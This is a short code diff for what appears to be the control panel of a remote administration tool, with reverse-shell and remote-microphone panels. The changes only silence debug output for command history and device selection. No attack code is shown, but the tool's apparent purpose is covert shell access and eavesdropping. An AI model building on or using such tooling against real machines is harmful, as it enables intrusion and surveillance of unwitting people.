@@ -229,7 +229,7 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
             this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
             wxString strTmp = this->vc_History[this->iHistorialPos];
             this->txtConsole->AppendText(strTmp);
-            std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
+            //std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
         }
     }else if (iCode == WXK_DOWN) {
         if (this->vc_History.size() > 0) {
@@ -239,7 +239,7 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
             this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
             wxString strTmp = this->vc_History[this->iHistorialPos];
             this->txtConsole->AppendText(strTmp);
-            std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
+            //std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
             
         }
 
@@ -320,7 +320,6 @@ void panelMicrophone::OnRefrescarDispositivos(wxCommandEvent& event) {
 void panelMicrophone::OnEscuchar(wxCommandEvent& event) {
     
     wxString str_device_id = this->mic_devices->GetStringSelection();
-    std::cout << str_device_id << std::endl;
     
     //Quien tiene mas de 10 microfonos :v ?
     std::string strComando = "";
